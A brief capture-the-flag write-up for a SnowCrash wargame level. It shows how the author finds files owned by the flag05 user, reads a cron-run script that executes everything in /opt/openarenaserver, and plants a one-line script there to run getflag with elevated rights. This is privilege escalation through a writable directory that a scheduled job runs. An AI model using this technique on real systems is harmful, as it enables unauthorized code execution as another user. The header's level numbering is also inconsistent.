# WRITE UP

**Box**:            SnowCrash

**Name**:           Level04

**Description**:    Find the flag to connect to level01

**Category**:       ???

**Difficulty**:     Easy

---

## Basic checking

```bash
ls -la
```

**NOTHING !!!**

So i'm looking for some file under **flag05** as owner.

```bash
find / -user flag05 2>/dev/null
```

##  Break the prison (got it ?)

And I find some **openarenaserver** files! In one of them (**/usr/sbin/openarenaserver**) a script that run every script inside another openarenaserver file (located in **/opt/openarenaserver**) then remove the executed file.
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

So I run:

```bash
echo 'bin/getflag > /tmp/key.txt' > /opt/openarenaserver/script.sh && chmod +x /opt/openarenaserver/script.sh
```

Just wait for the crontab to execute the first script (the one that run all the others).
Then:
```bash
cat /tmp/key.txt
```

**FLAG FOUND**